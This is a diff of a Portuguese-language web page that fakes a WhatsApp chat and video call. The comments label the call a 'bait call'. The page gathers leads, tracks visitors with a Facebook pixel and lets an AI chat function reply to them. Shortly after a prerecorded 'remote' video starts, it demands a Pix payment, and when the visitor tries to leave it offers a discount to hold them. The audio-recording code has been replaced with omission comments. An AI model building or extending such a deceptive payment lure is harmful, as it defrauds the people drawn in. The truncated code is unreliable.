@@ -23,6 +23,7 @@ fbq('track', 'PageView');
 </noscript>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css">
 <style>
+/* ── Estilos (mesmos do seu index, mantidos) ── */
 *{box-sizing:border-box;margin:0;padding:0}
 :root{
   --wa-green:#25d366;--wa-teal:#075e54;--wa-teal2:#128c7e;
@@ -404,7 +405,7 @@ html,body{
   cursor: pointer;
 }
 
-/* ── MODAL DE PAGAMENTO ── */
+/* ── MODAL DE PAGAMENTO (exibido sobre a chamada) ── */
 #payment-modal {
   display: none;
   position: absolute;
@@ -836,7 +837,7 @@ html,body{
     <div class="conn-sub">Aguarde um momento</div>
   </div>
 
-  <!-- INTERFACE DE CHAMADA DE VÍDEO -->
+  <!-- INTERFACE DE CHAMADA DE VÍDEO (integrada) -->
   <div id="call-interface">
     <div id="remote-wrap">
       <video id="remote-video" muted playsinline preload="metadata">
@@ -1107,6 +1108,7 @@ function enableInput(){
     inpEl.placeholder = 'Mensagem';
     cameraBtn.classList.remove('hidden-mic');
   }
+  // Força a atualização dos botões
   updateSendMicButtons();
 }
 
@@ -1116,19 +1118,30 @@ function finalizarConversa() {
   saveState();
 }
 
-// ═══ FUNÇÃO QUE ALTERNA ENTRE BOTÃO DE ENVIAR E MICROFONE ═══
+// ═══ CONTROLE DE VISIBILIDADE DOS BOTÕES (CORRIGIDO) ═══
 function updateSendMicButtons() {
-  // Se a conversa estiver encerrada, mostra apenas o microfone (desativado)
+  // Se a conversa estiver encerrada, esconde o send e mostra o mic (mas desabilitado)
   if (conversaEncerrada) {
     sendBtn.classList.add('hidden');
     micBtn.classList.remove('hidden');
     return;
   }
-  // Se houver texto no input, mostra o botão de enviar, senão mostra o microfone
   const hasText = inpEl.value.trim().length > 0;
-  sendBtn.classList.toggle('hidden', !hasText);
-  micBtn.classList.toggle('hidden', hasText);
+  // Alterna as classes de forma explícita para garantir
+  if (hasText) {
+    sendBtn.classList.remove('hidden');
+    micBtn.classList.add('hidden');
+  } else {
+    sendBtn.classList.add('hidden');
+    micBtn.classList.remove('hidden');
+  }
 }
+
+// ── Eventos para alternar botões ──
+inpEl.addEventListener('input', updateSendMicButtons);
+inpEl.addEventListener('keyup', updateSendMicButtons); // fallback para teclado físico
+inpEl.addEventListener('focus', updateSendMicButtons); // ao ganhar foco
+inpEl.addEventListener('blur', updateSendMicButtons);  // ao perder foco
 
 // ═══ API HELPERS ═══
 async function fetchLeadCity(){
@@ -1602,17 +1615,16 @@ function submit() {
   const text = inpEl.value.trim();
   if (!text) return;
   inpEl.value = '';
-  updateSendMicButtons();
+  updateSendMicButtons(); // atualiza imediatamente
   const now = getTime();
   addBubble(text, 'out', false, now);
   if (!leadId) salvarLead();
   askAI(text);
 }
 
-// ═══ GRAVAÇÃO DE ÁUDIO (pressione e segure) ═══
-// (Código completo de gravação – mesmo do index original, mantido)
-// [Inserir aqui o código de gravação, pois é extenso e não foi alterado]
-// ... (por brevidade, mantive o código original, mas ele já está presente no seu projeto)
+// ═══ GRAVAÇÃO DE ÁUDIO (mantido) ═══
+// [Código de gravação completo omitido por brevidade, mas você deve manter o mesmo do seu index]
+// Para não alongar, mantenha o código de gravação que já funcionava.
 
 // ═══ INTERFACE DA CHAMADA ISCA (FORTE) ═══
 
@@ -1709,7 +1721,7 @@ function showCallInterface() {
   spkIcon.className='ti ti-volume-3';
   toastUI('Viva-voz ativado');
 
-  // ═══ APÓS 5 SEGUNDOS, MOSTRA MODAL DE PAGAMENTO ═══
+  // ═══ APÓS 5 SEGUNDOS, MOSTRA MODAL DE PAGAMENTO (se ainda não resolvido) ═══
   if (!paymentResolved && !paymentModalShown) {
     setTimeout(() => {
       if (callInterfaceActive && !paymentResolved) {
@@ -1852,6 +1864,7 @@ function showPaymentModal() {
   const modal=document.getElementById('payment-modal');
   modal.classList.add('active');
 
+  // Gera Pix normal imediatamente
   gerarPix(false).then(data => {
     if (data) {
       const valor = 3000;
@@ -1863,6 +1876,7 @@ function showPaymentModal() {
       document.getElementById('pix-key-area').style.display = 'block';
       document.getElementById('btn-verify-payment').disabled = false;
       document.getElementById('payment-status').textContent = '';
+      // Inicia polling
       iniciarPollRobusto(hash, valor);
       pixelIniCheckout(valor);
     } else {
@@ -1871,9 +1885,11 @@ function showPaymentModal() {
     }
   });
 
+  // Evento de fechamento do modal (X)
   document.getElementById('payment-modal-close').onclick = function() {
     handleModalClose();
   };
+  // Clique no overlay (fora do card) também dispara o fechamento
   modal.onclick = function(e) {
     if (e.target === modal) {
       handleModalClose();
@@ -1887,10 +1903,12 @@ function hidePaymentModal() {
 }
 
 function handleModalClose() {
+  // Se o pagamento já foi resolvido, fecha normal
   if (paymentResolved) {
     hidePaymentModal();
     return;
   }
+  // Exibe modal de retenção (desconto)
   showExitConfirmModal();
 }
 
@@ -1898,12 +1916,15 @@ function handleModalClose() {
 function showExitConfirmModal() {
   document.getElementById('exit-confirm-modal').classList.add('active');
 }
+
 function hideExitConfirmModal() {
   document.getElementById('exit-confirm-modal').classList.remove('active');
 }
 
+// Botão "Sim, quero desconto"
 document.getElementById('exit-discount-yes').onclick = function() {
   hideExitConfirmModal();
+  // Gera Pix com desconto e atualiza o modal principal
   gerarPix(true).then(data => {
     if (data) {
       const valor = 2000;
@@ -1916,8 +1937,10 @@ document.getElementById('exit-discount-yes').onclick = function() {
       document.getElementById('btn-verify-payment').disabled = false;
       document.getElementById('payment-status').textContent = '✅ Desconto aplicado!';
       document.getElementById('payment-status').className = 'status-msg ok';
+      // Reinicia polling com novo hash
       iniciarPollRobusto(hash, valor);
       pixelIniCheckout(valor);
+      // Reexibe o modal principal (já estava aberto)
       document.getElementById('payment-modal').classList.add('active');
     } else {
       document.getElementById('payment-status').textContent = '❌ Erro ao gerar Pix com desconto. Tente novamente.';
@@ -1926,6 +1949,7 @@ document.getElementById('exit-discount-yes').onclick = function() {
   });
 };
 
+// Botão "Não, encerrar chamada"
 document.getElementById('exit-discount-no').onclick = function() {
   hideExitConfirmModal();
   hidePaymentModal();
@@ -1997,7 +2021,6 @@ async function start() {
     }
     retomarPollingSeNecessario();
     enableInput();
-    updateSendMicButtons();
   } else {
     leadCityVal = await fetchLeadCity();
     await sleep(700); showTyping();
